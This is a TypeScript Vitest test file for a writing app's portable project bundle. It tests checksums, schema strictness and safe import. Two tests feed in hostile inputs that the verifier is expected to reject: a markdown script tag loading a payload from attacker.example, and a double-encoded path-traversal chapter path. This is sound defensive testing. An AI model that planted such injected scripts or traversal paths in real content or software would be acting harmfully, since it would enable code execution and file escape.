import { describe, expect, it } from "vitest";

import {
  canonicalJson,
  createPortableBundle,
  exportPortableBundle,
  importPortableBundle,
  parsePortableBundle,
  serializePortableBundle,
  sha256Hex,
  utf8ByteLength,
  verifyPortableBundle,
  type PortableBundleMetadata,
  type PortableBundleV1,
  type PortableProjectInput,
} from "../src/index.js";

const projectInput = {
  project: {
    id: "project-ink-shadow",
    title: "墨影长篇",
    description: "A local-first writing project.",
    language: "zh-CN",
    createdAt: "2026-07-27T00:00:00.000Z",
    updatedAt: "2026-07-27T01:00:00.000Z",
  },
  chapters: [
    {
      id: "chapter-1",
      title: "序章",
      order: 0,
      markdown: "雨落在旧城。\n\n**灯火未熄。**",
    },
    {
      id: "chapter-2",
      title: "来客",
      order: 1,
      markdown: "门外响起三声叩门。",
    },
  ],
} satisfies PortableProjectInput;

const metadata = {
  bundleId: "bundle-2026-07-27",
  exportedAt: "2026-07-27T02:00:00.000Z",
  generatorVersion: "0.1.0",
} satisfies PortableBundleMetadata;

describe("Portable Bundle v1", () => {
  it("round-trips a project with deterministic content and entry checksums", async () => {
    const first = await createPortableBundle(projectInput, metadata);
    const second = await createPortableBundle(projectInput, metadata);

    expect(first).toEqual(second);
    expect(first.manifest.version).toBe(1);
    expect(first.manifest.counts.chapters).toBe(2);
    expect(first.manifest.entries).toHaveLength(2);
    expect(first.manifest.entries[0]?.path).toBe("chapters/0001-序章.md");

    const json = await serializePortableBundle(first);
    const parsed = await parsePortableBundle(json);
    const imported = await importPortableBundle(await exportPortableBundle(projectInput, metadata));

    expect(parsed).toEqual(first);
    expect(imported).toEqual(first.content);
  });

  it("round-trips an intentionally empty chapter without inventing正文", async () => {
    const emptyProject = {
      ...projectInput,
      chapters: [
        {
          id: "chapter-empty",
          title: "待写章节",
          order: 0,
          markdown: "",
        },
      ],
    } satisfies PortableProjectInput;

    const bundle = await createPortableBundle(emptyProject, metadata);
    expect(bundle.content.chapters[0]?.markdown).toBe("");
    expect(bundle.manifest.entries[0]?.byteLength).toBe(0);

    const imported = await importPortableBundle(await serializePortableBundle(bundle));
    expect(imported.chapters[0]?.markdown).toBe("");
  });

  it("rejects an unsupported bundle version before schema parsing", async () => {
    const bundle = await createPortableBundle(projectInput, metadata);
    const futureBundle = {
      ...bundle,
      manifest: {
        ...bundle.manifest,
        version: 2,
      },
    };

    await expect(verifyPortableBundle(futureBundle)).rejects.toMatchObject({
      code: "BUNDLE_VERSION_UNSUPPORTED",
    });
  });

  it("rejects corrupt bundle and chapter checksums", async () => {
    const bundle = await createPortableBundle(projectInput, metadata);
    const corruptBundleChecksum: PortableBundleV1 = {
      ...bundle,
      manifest: {
        ...bundle.manifest,
        checksum: {
          algorithm: "sha256",
          value: "0".repeat(64),
        },
      },
    };
    await expect(verifyPortableBundle(corruptBundleChecksum)).rejects.toMatchObject({
      code: "BUNDLE_CHECKSUM_MISMATCH",
    });
    await expect(serializePortableBundle(corruptBundleChecksum)).rejects.toMatchObject({
      code: "BUNDLE_CHECKSUM_MISMATCH",
    });

    const firstEntry = bundle.manifest.entries[0];
    expect(firstEntry).toBeDefined();
    if (firstEntry === undefined) {
      return;
    }
    const corruptEntryChecksum: PortableBundleV1 = {
      ...bundle,
      manifest: {
        ...bundle.manifest,
        entries: [
          {
            ...firstEntry,
            checksum: {
              algorithm: "sha256",
              value: "f".repeat(64),
            },
          },
          ...bundle.manifest.entries.slice(1),
        ],
      },
    };
    await expect(verifyPortableBundle(corruptEntryChecksum)).rejects.toMatchObject({
      code: "BUNDLE_ENTRY_CHECKSUM_MISMATCH",
      path: firstEntry.path,
    });
  });

  it("rejects strict-schema additions and manifest/content divergence", async () => {
    const bundle = await createPortableBundle(projectInput, metadata);
    await expect(
      verifyPortableBundle({
        ...bundle,
        manifest: {
          ...bundle.manifest,
          executable: true,
        },
      }),
    ).rejects.toMatchObject({
      code: "BUNDLE_SCHEMA_INVALID",
    });

    await expect(
      verifyPortableBundle({
        ...bundle,
        manifest: {
          ...bundle.manifest,
          counts: {
            chapters: 1,
          },
        },
      }),
    ).rejects.toMatchObject({
      code: "BUNDLE_MANIFEST_CONTENT_MISMATCH",
    });
  });

  it("rejects checksum-valid executable Markdown content", async () => {
    const bundle = await createPortableBundle(projectInput, metadata);
    const firstChapter = bundle.content.chapters[0];
    const firstEntry = bundle.manifest.entries[0];
    expect(firstChapter).toBeDefined();
    expect(firstEntry).toBeDefined();
    if (firstChapter === undefined || firstEntry === undefined) {
      return;
    }

    const maliciousMarkdown = '<script src="https://attacker.example/payload.js"></script>';
    const maliciousContent = {
      ...bundle.content,
      chapters: [
        {
          ...firstChapter,
          markdown: maliciousMarkdown,
        },
        ...bundle.content.chapters.slice(1),
      ],
    };
    const canonicalContent = canonicalJson(maliciousContent);
    const maliciousBundle: PortableBundleV1 = {
      content: maliciousContent,
      manifest: {
        ...bundle.manifest,
        contentBytes: utf8ByteLength(canonicalContent),
        checksum: {
          algorithm: "sha256",
          value: await sha256Hex(canonicalContent),
        },
        entries: [
          {
            ...firstEntry,
            byteLength: utf8ByteLength(maliciousMarkdown),
            checksum: {
              algorithm: "sha256",
              value: await sha256Hex(maliciousMarkdown),
            },
          },
          ...bundle.manifest.entries.slice(1),
        ],
      },
    };

    await expect(verifyPortableBundle(maliciousBundle)).rejects.toMatchObject({
      code: "IMPORT_UNSAFE_CONTENT",
      path: firstChapter.path,
    });
  });

  it("rejects traversal paths even when manifest and content agree", async () => {
    const bundle = await createPortableBundle(projectInput, metadata);
    const firstChapter = bundle.content.chapters[0];
    const firstEntry = bundle.manifest.entries[0];
    expect(firstChapter).toBeDefined();
    expect(firstEntry).toBeDefined();
    if (firstChapter === undefined || firstEntry === undefined) {
      return;
    }

    const traversalPath = "chapters/%252e%252e/escape.md";
    const unsafeContent = {
      ...bundle.content,
      chapters: [
        {
          ...firstChapter,
          path: traversalPath,
        },
        ...bundle.content.chapters.slice(1),
      ],
    };
    const canonicalContent = canonicalJson(unsafeContent);
    const unsafeBundle: PortableBundleV1 = {
      content: unsafeContent,
      manifest: {
        ...bundle.manifest,
        contentBytes: utf8ByteLength(canonicalContent),
        checksum: {
          algorithm: "sha256",
          value: await sha256Hex(canonicalContent),
        },
        entries: [
          {
            ...firstEntry,
            path: traversalPath,
          },
          ...bundle.manifest.entries.slice(1),
        ],
      },
    };

    await expect(verifyPortableBundle(unsafeBundle)).rejects.toMatchObject({
      code: "IMPORT_PATH_TRAVERSAL",
    });
  });
});
